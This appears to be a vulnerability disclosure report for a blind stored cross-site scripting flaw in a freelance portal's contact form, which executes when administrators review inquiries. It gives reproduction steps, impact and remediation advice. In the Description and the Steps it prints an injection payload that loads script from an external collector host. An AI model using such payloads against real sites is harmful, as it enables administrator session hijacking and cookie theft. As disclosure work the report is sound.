## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Input Parameters (Name, Phone, and Message Fields) on Freelance Portal Admin Dashboard.

## Affected URL

https://freelance.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the contact form submission handler of the freelance portal. User-supplied input submitted through contact form fields (such as Name, Phone, and Message) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping. 

When an administrative user reviews submitted inquiries within the admin dashboard (`/admin/`), the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application public interface: `https://freelance.pwnedbox.site/#contact`.
2. Locate the project inquiry form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Full Name field, or payloads into Phone and Message fields).
3. Submit the project inquiry form.
4. Log into the administrative control panel where stored inquiries are reviewed (`https://freelance.pwnedbox.site/admin/inquiries.php` or inquiry detail view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC
<img width="1532" height="1215" alt="image" src="https://github.com/user-attachments/assets/9fe74f39-a125-4152-b7c7-05c952d778b3" />
<img width="1493" height="1173" alt="image" src="https://github.com/user-attachments/assets/6e7e333e-d204-46aa-b373-a44b09ccf8a2" />

<img width="1718" height="1270" alt="image" src="https://github.com/user-attachments/assets/07c4b51a-c67e-41a3-9fb7-08df510cb96e" />


## Impact

1. Execution of arbitrary JavaScript code within the high-privilege session of an administrator viewing stored inquiries.
2. Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of application data or user accounts.
3. Persistent code execution affecting backend handlers and staff review panels.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative interfaces or dashboards.
2. Apply strict input validation and sanitization policies on all contact form submission endpoints (Name, Phone, Email, Message fields) to reject or neutralize HTML markup and script tags.
3. Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
